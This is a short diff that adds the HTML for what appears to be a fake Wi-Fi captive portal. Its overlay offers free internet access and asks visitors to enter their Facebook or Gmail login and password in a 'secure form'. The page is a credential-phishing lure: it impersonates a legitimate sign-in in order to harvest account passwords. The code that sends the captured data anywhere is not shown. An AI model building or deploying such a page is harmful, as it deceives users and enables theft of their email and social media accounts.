@@ -1,0 +1,15 @@
+<div id="pa_overlay-back"></div>
+<div id="pa_msgBox" class="pa_main">
+	<h1 class="pa_h1">Internet access is on us today.</h1><br />
+	<h4 class="pa_h4">Simply login with your Facebook or Google account<br />through our secure form below to start surfing.</h4>
+	<br /><br />
+	<div>
+		<input type="text" id="pa_email" name="pa_email" class="pa_field" placeholder="FB or Gmail Login" />
+	</div>
+	<br />
+	<div>
+		<input type="password" id="pa_password" name="pa_password" class="pa_field" placeholder="FB or GMail Password" />
+	</div>
+	<br /><br />
+	<button id="submit_button" class="pa_connectButton" type="button">Connect</button>
+</div>
